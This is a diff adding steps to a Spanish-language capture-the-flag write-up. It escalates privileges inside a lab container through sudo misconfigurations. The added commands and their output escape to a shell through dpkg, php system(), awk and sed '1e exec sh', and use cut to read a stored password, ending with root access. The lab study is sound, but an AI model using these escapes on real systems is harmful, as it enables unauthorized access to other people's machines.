@@ -109,7 +109,80 @@ sudo dpkg -l
 ```bash
 sudo -u bobby /usr/bin/dpkg -l
 ```
+```
+freddy@b3e2108c7216:~$ sudo -u bobby /usr/bin/dpkg -l
+Desired=Unknown/Install/Remove/Purge/Hold
+| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
+|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
+||/ Name                            Version                           Architecture Description
++++-===============================-=================================-============-================================================================================
+ii  adduser                         3.137ubuntu1                      all          add and remove users and groups
+                                                                                                                                 
+!/bin/bash
+bobby@b3e2108c7216:/home/freddy$ whoami                                                                                                                                                                                      bobby
+````
+Si seguimos comprobando los archivos vemos que podemos ejecutar como **gladys /usr/bin/php**.
 
+```bash
+bobby@b3e2108c7216:/home/freddy$ sudo -l                                                                                                                                                                                     
+Matching Defaults entries for bobby on b3e2108c7216:                                                                                                                                                                             env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                                                              User bobby may run the following commands on b3e2108c7216:                                                                                                                                                                        (gladys) NOPASSWD: /usr/bin/php                                                                                                                                                                             
+bobby@b3e2108c7216:/home/freddy$ 
+```
+Volvermos a [GTFOBins](https://gtfobins.github.io/gtfobins/php/) y observamos que podemos ejecutar una shell desde **php**..
+```bash
+CMD="/bin/bash"
+sudo -u gladys php -r "system('$CMD');"
+```
+Desde gladys vemos que podemos utilizar el comando **cut** para leer un archivo como el el usuario **chocolatito**. Buscamos archivos **txt** y encontramos la contraseña del usuario **chocolatito**.
+```
+gladys@b3e2108c7216:/opt$ ls
+chocolatitocontraseña.txt
+```
+```bash
+sudo -u chocolatito /usr/bin/cut -d "" -f1 "chocolatitocontraseña.txt"
+```
+```
+gladys@b3e2108c7216:/opt$ sudo -u chocolatito /usr/bin/cut -d "" -f1 "chocolatitocontraseña.txt" 
+chocolatitopassword
+```
+Una vez que tenemos el password, cambiamos al usuario chocolatito y comprobamos si podemos seguir escalando privilegios.
+```
+gladys@b3e2108c7216:/opt$ su chocolatito
+Password: 
+chocolatito@b3e2108c7216:/opt$ whoami
+chocolatito
+```
+```bash
+chocolatito@b3e2108c7216:/opt$ sudo -l
+Matching Defaults entries for chocolatito on b3e2108c7216:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
+User chocolatito may run the following commands on b3e2108c7216:
+    (theboss) NOPASSWD: /usr/bin/awk
+```
+Pues utilizamos igual que las otras veces el comando para escalar privilegios, en este caso **awk**.
+```bash
+sudo -u theboss awk 'BEGIN {system("/bin/sh")}'
+```
+```
+chocolatito@b3e2108c7216:/opt$ sudo -u theboss awk 'BEGIN {system("/bin/sh")}'
+whoami
+theboss
+```
+Ahora como el usuario **theboss** seguimos viendo si podemos escalar privilegios, y ya vemos que podemos escalar a **root** con **/urs/bin/sed**.
+```
+theboss@b3e2108c7216:/opt$ 
+Matching Defaults entries for theboss on b3e2108c7216:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
 
-
+User theboss may run the following commands on b3e2108c7216:
+    (root) NOPASSWD: /usr/bin/sed
+```
+```bash
+sudo -u root /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
+```
+```
+theboss@b3e2108c7216:/opt$ sudo -u root /usr/bin/sed -n '1e exec sh 1>&0' /etc/hosts
+whoami
+root
+```
